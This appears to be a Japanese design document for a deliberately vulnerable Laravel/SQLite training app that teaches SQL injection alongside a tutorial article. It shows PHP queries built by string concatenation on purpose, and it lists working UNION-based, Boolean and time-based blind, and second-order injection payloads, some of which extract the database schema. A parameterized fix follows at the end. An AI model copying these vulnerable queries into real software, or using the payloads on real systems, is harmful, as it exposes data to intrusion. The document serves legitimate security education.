# docs/DESIGN.md - sqli-lab 設計書

## 1. 目的
Zenn記事の読者が Burp Suite を使いながら以下を体験できる教材アプリを提供する:
1. **UNION-based SQLi** — カラム数特定 → sqlite_version() → スキーマ抽出
2. **Blind SQLi** — Boolean-based / Time-based の2種
3. **Second-order SQLi** — 登録時に保存されたペイロードが別画面で発火

## 2. ER図

```
products                users                  posts
+------------+          +------------+          +------------+
| id (PK)    |          | id (PK)    |          | id (PK)    |
| name       |          | username   |          | author     |
| category   |          | email      |          | title      |
| price      |          | created_at |          | body       |
| stock      |          +------------+          | created_at |
| description|                                  +------------+
| created_at |
+------------+

※ 外部キー制約は設けない（やられアプリとして単純化するため）
```

## 3. テーブル定義

### products（商品検索 / UNION-based・Blind SQLi 演習用）
| カラム      | 型       | 備考                          |
|------------|----------|-------------------------------|
| id         | INTEGER  | PK, AUTOINCREMENT             |
| name       | TEXT     | 商品名。検索対象              |
| category   | TEXT     | カテゴリ（例: 文房具, 食品）  |
| price      | INTEGER  | 価格                          |
| stock      | INTEGER  | 在庫数                        |
| description| TEXT     | 商品説明                      |
| created_at | DATETIME | 作成日時                      |

**カラム数: 7**（UNION-basedでカラム数特定の演習に使う）

**Seederデータ例:**
| name         | category | price | stock | description          |
|-------------|----------|-------|-------|----------------------|
| ボールペン   | 文房具   | 150   | 100   | 書きやすいボールペン |
| ノート       | 文房具   | 300   | 50    | A4サイズ方眼ノート   |
| チョコレート | 食品     | 200   | 80    | ミルクチョコレート   |
| コーヒー豆   | 食品     | 800   | 30    | コロンビア産         |
| USBメモリ   | 電子機器 | 1200  | 25    | 32GB USB3.0          |
| マウス       | 電子機器 | 2500  | 15    | ワイヤレスマウス     |
| 消しゴム     | 文房具   | 80    | 200   | よく消える消しゴム   |
| 緑茶         | 食品     | 150   | 60    | 静岡産緑茶           |

### users（Second-order SQLi 入口）
| カラム      | 型       | 備考                              |
|------------|----------|-----------------------------------|
| id         | INTEGER  | PK, AUTOINCREMENT                 |
| username   | TEXT     | ペイロードがここに保存される      |
| email      | TEXT     | メールアドレス                    |
| created_at | DATETIME | 作成日時                          |

**バリデーションなし。** 任意の文字列をusernameに格納できる状態にする。

### posts（Second-order SQLi 発火点）
| カラム      | 型       | 備考                          |
|------------|----------|-------------------------------|
| id         | INTEGER  | PK, AUTOINCREMENT             |
| author     | TEXT     | 投稿者名（usernameと照合）    |
| title      | TEXT     | 投稿タイトル                  |
| body       | TEXT     | 投稿本文                      |
| created_at | DATETIME | 作成日時                      |

**Seederデータ例:**
| author | title              | body                     |
|--------|--------------------|--------------------------|
| admin  | テスト投稿1         | これはテスト投稿です。    |
| admin  | テスト投稿2         | 管理者の2つ目の投稿。    |
| tanaka | 商品レビュー        | ボールペンが良かった。    |

## 4. 画面設計

### GET /search — 商品検索
```
[ヘッダー: SQLi Lab - 商品検索]

[検索フォーム: keyword入力欄] [検索ボタン]

検索結果:
| ID | 商品名 | カテゴリ | 価格 | 在庫 | 説明 |
| -- | ------ | -------- | ---- | ---- | ---- |
| 1  | ...    | ...      | ...  | ...  | ...  |

※ 結果が0件の場合:「該当する商品がありません」表示
※ SQLエラーの場合: エラーメッセージをそのまま表示（学習用）
```

**脆弱なクエリ:**
```php
// VULNERABLE: ユーザー入力を直接文字列結合している
$keyword = $request->input('keyword', '');
$results = DB::select(
    "SELECT * FROM products WHERE name LIKE '%" . $keyword . "%'"
);
```

### GET|POST /register — ユーザー登録
```
[ヘッダー: SQLi Lab - ユーザー登録]

ユーザー名: [入力欄]
メール:     [入力欄]
[登録ボタン]

登録完了メッセージ: 「ユーザー「{username}」を登録しました。ID: {id}」
（登録後 /profile/{id} へのリンクを表示）
```

**脆弱なクエリ:**
```php
// VULNERABLE: ユーザー入力を直接文字列結合してINSERT
DB::insert(
    "INSERT INTO users (username, email, created_at) VALUES ('" . $username . "', '" . $email . "', datetime('now'))"
);
```

### GET /profile/{id} — プロフィール
```
[ヘッダー: SQLi Lab - プロフィール]

ユーザー名: {username}
メール: {email}

{username}さんの投稿一覧:
| ID | タイトル | 本文 | 投稿日 |
| -- | -------- | ---- | ------ |
| 1  | ...      | ...  | ...    |
```

**Second-order発火クエリ:**
```php
// まずユーザー情報を取得（ここはIDベースなので安全）
$user = DB::select("SELECT * FROM users WHERE id = ?", [$id]);
$username = $user[0]->username;

// VULNERABLE: DBから取得した値を信頼して文字列結合
$posts = DB::select(
    "SELECT * FROM posts WHERE author = '" . $username . "'"
);
```

## 5. 想定される攻撃シナリオ（記事で解説する内容）

### UNION-based SQLi（/search）
```
-- Step 1: カラム数特定
%' UNION SELECT 1,2,3,4,5,6,7 --

-- Step 2: 表示カラム確認（画面に 1〜7 のどれが表示されるか）

-- Step 3: SQLiteバージョン取得
%' UNION SELECT 1,2,sqlite_version(),4,5,6,7 --

-- Step 4: テーブル一覧取得（スキーマ抽出）
%' UNION SELECT 1,2,name,4,5,6,7 FROM sqlite_master WHERE type='table' --

-- Step 5: カラム一覧取得
%' UNION SELECT 1,2,sql,4,5,6,7 FROM sqlite_master WHERE name='users' --
```

### Boolean-based Blind SQLi（/search）
```
-- 真の場合: 正常な検索結果が返る
%' AND 1=1 --

-- 偽の場合: 結果が0件になる
%' AND 1=2 --

-- 応用: 1文字ずつ情報を抜く
%' AND SUBSTR(sqlite_version(),1,1)='3' --
```

### Time-based Blind SQLi（/search）
```
-- SQLiteにはSLEEP関数がないため、重い処理で遅延を発生させる
%' AND CASE WHEN 1=1 THEN randomblob(100000000) ELSE 1 END --
```

### Second-order SQLi（/register → /profile）
```
-- Step 1: ペイロードをユーザー名として登録
username: ' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE name='users' --
email: test@example.com

-- Step 2: /profile/{id} にアクセスすると、
-- usernameがpostsテーブルへのクエリに展開されて発火
```

## 6. 対策の解説（記事末尾で示すコード）
記事の最後に「正しい実装」として以下を示す:
```php
// 安全な実装: プレースホルダを使う
$results = DB::select(
    "SELECT * FROM products WHERE name LIKE ?",
    ['%' . $keyword . '%']
);
```

## 7. 補足
- Laravelデフォルトのusersマイグレーションは削除し、カスタムで作る
- 認証機能は一切入れない
- CSSはTailwind CDNのみ。ビルド不要にする
- SQLエラーはcatchせずそのまま画面に出す（APP_DEBUG=true前提）